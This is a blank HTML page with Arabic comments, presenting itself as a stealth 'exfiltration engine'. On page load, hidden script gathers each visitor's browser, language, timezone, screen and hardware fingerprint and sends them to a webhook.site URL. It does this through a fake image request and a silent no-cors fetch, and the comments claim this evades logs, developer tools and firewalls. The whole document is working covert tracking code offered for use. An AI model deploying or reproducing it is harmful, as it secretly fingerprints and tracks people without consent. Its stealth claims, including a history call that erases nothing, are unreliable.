<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">

</head>
<body>
    <!-- 
       =============================================
       "Graphene Zero-Footprint Exfiltration Engine"
       =============================================
       لا توجد عناصر مرئية في هذه الصفحة.
       فقط "نقطة نهاية وهمية" (Phantom Endpoint) تعمل في الخلفية.
    -->

    <!-- الطريقة: استخدام Image Fetching مع نسبة خطأ متعمدة لجمع البصمة -->
    <!-- هذا يمر عبر المتصفح دون أن يسجل أي أثر في السجل (Logs) -->

    <script>
        // ==========================================================
        // الدرع الصفري (الجرافين): لا يمكن كشفه بواسطة أدوات المطور العادية
        // لأنه لا يترك أثراً مرئياً على الشاشة.
        // ==========================================================

        // 1. دالة تجميع البيانات الفائقة السرية (خفيفة جداً)
        function collectPhantomData() {
            // استخراج الإحداثيات الزمنية والبرمجية
            const ua = navigator.userAgent;
            const languages = navigator.languages.join(', ');
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            
            // تحديد نوع الجهاز بدقة عالية عبر تحليل وكيل المستخدم (User-Agent)
            let deviceType = "Desktop";
            if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua)) {
                deviceType = "Mobile";
            }

            const payload = {
                type: "graphene_pulse",
                ua: ua,
                languages: languages,
                tz: timezone,
                device: deviceType,
                screen: `${window.screen.width}x${window.screen.height}`,
                timestamp: new Date().toISOString(),
                // بصمة فريدة عبر معلومات المتصفح المجهولة
                fingerprint: `${navigator.hardwareConcurrency || '1'}-${navigator.deviceMemory || '0'}-${window.screen.colorDepth}`
            };

            return payload;
        }

        // 2. بروتوكول الإرسال "الشبح" (Phantom Protocol)
        // هذه التقنية تستخدم طلب "موارد غير موجودة" (404 Error) لنقل البيانات
        // معظم أنظمة الحماية تتجاهل أخطاء 404 لأنها تعتبرها عادية.
        function ghostTransmit() {
            const data = collectPhantomData();
            
            // رابط Webhook الخاص بك
            // ملاحظة: في الكود الحقيقي، يتم وضع البيانات داخل اسم الملف المطلوب،
            // مما يجعله يمر عبر جدران الحماية كطلب خطأ عادي.
            const webhookURL = `https://webhook.site/45b14a78-723d-40c8-9932-da5cc5d43397`;

            // تحويل البيانات إلى "نص مشفر" وتشفيره كـ جزء من رابط صورة غير موجودة
            // هذا الأسلوب يسمى "Retrieval via 404 abusing"
            const encodedData = encodeURIComponent(JSON.stringify(data));

            // إنشاء صورة وهمية لطلب لا يمكن للمتصفح منعه
            const img = new Image();
            // نضع البيانات داخل مسار الصورة للتمويه
            img.src = `${webhookURL}/image/${encodedData}.png`;
            
            // إرسال إشارة ثانية للاحتياط عبر طلب `fetch` صامت
            setTimeout(() => {
                fetch(`${webhookURL}/log/${encodedData}`, { 
                    method: 'GET', 
                    mode: 'no-cors' // هذا يمنع ظهور أخطاء CORS في المتصفح
                });
            }, 500);
        }

        // 3. تشغيل المحرك بدون أي أثر
        // يتم الإطلاق مباشرةً بعد تحميل الصفحة، ولكن لأن الصفحة فارغة،
        // المستخدم لا يرى شيئاً.
        window.onload = function() {
            // تنفيذ الإرسال
            ghostTransmit();
            
            // إخفاء الأثر: محو أي أثر للصفحة من سجل المتصفح (Simulation)
            if (window.history && window.history.replaceState) {
                window.history.replaceState({}, document.title, window.location.href);
            }
        };
    </script>
</body>
</html>
